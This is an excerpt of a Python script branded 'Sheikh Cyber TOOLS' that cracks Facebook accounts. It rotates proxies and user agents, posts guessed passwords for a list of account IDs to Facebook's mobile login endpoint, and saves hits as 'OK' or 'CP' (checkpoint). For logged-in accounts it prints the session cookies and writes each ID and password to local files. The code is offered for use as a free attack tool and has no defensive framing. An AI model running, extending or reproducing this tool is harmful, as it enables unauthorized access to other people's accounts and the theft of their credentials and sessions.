...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/khorsedsheikh.420')
#------------------[ Sheikh-Cyber ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/Khorsed12/Api/blob/main/prox.txt').text
...
\033[1;91m  ███████║██║  ██║███████╗██║██║  ██╗██║  ██║
\033[1;91m  ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝\033[1;93m
\033[0;41m        [ WELCOME TO Sheikh Cyber TOOLS ]         \033[0;92m
\x1b[1;93m┏───────────────────────────────────────────────┓
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m AUTHOR     \x1b[1;97m: \x1b[1;92mSheikh Cyber
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m GITHUB     \x1b[1;97m: \x1b[1;92mKhorsed12   
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TOOL       \x1b[1;97m: \x1b[1;92mFILE-CLONING   
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m VERSION    \x1b[1;97m: \x1b[1;92m0.1
\x1b[1;93m┗───────────────────────────────────────────────┛""")  
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92+\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
...
def menu():
    ...
    print('\033[0;97m===============================================')
    print(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
    print(f'\033[1;92m[\033[1;34m2\033[1;92m] CONTACT ME')
    print(f'\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz')
    print(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
    print('\033[0;97m=================')
...
def result():
    ...
    if kz in ['1','01']:
        ...
        if len(vin)==0:
            ...
            print('\033[0;91m==================')
            geeh = input(' \033[97;1m[\033[92;1m☠️\033[97;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m☠️\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m☠️\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f' \033[97;1m[\033[92;1m☠️\033[97;1m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m☠️\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Sheikh☠️M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}☠️{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Sheikh-Cp] {idf} ☠️ {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' ☠️ '+pw+'\n')
                akun.append(idf+' ☠️ '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;92m[Sheikh-OkðŸ’š] {idf} ☠️ {pw}\n\033[0;93m[ðŸŒº]= COOKIES ☠️ \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Sheikh,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' ☠️ '+pw+'\n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Sheikh-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}☠️{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}☠️Sheikh-Cp] {idf} ☠️ {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' ☠️ '+pw+'\n')
                akun.append(idf+' ☠️ '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}☠️Sheikh-Ok] {idf} ☠️ {pw} ')
                os.system('espeak -a 300 " Ok,  Sheikh,  id"')
                open('OK/'+okc,'a').write(idf+' ☠️ '+pw+'\n')
                break
